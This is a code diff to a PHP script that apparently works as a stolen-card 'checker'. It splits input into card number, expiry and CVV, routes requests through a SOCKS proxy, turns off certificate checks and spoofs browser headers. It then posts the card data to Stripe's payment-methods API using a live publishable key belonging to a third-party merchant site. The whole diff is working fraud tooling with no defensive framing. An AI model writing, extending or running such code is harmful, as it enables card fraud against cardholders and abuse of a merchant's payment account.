@@ -47,6 +47,33 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /v1/payment_methods h2',
+'Host: api.stripe.com',
+'accept: application/json',
+'content-type: application/x-www-form-urlencoded',
+'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'origin: https://js.stripe.com',
+'sec-fetch-site: same-site',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://js.stripe.com/',
+'accept-language: en-US,en;q=0.9',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+
+# ----------------- [1req Postfields] ---------------------#
+
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=4bbd7843-3f30-472c-aa17-bea2923e58007c680c&sid=497c8554-6c45-4140-87ff-6590857b1cd03febcc&pasted_fields=number&payment_user_agent=stripe.js%2F42e38e0277%3B+stripe-js-v3%2F42e38e0277%3B+card-element&referrer=https%3A%2F%2Fhospicesenb.ca&time_on_page=104300&key=pk_live_51HSROsJidSrnbkCNweqOnOTO7wQwLWX6mRFNAP83H5YChtLFqLZTae4AhfoW7ATeXJ2x96XZQyaMetW9dPS1pEaR00ju9n1ZPO');
 
 $result1 = curl_exec($ch);
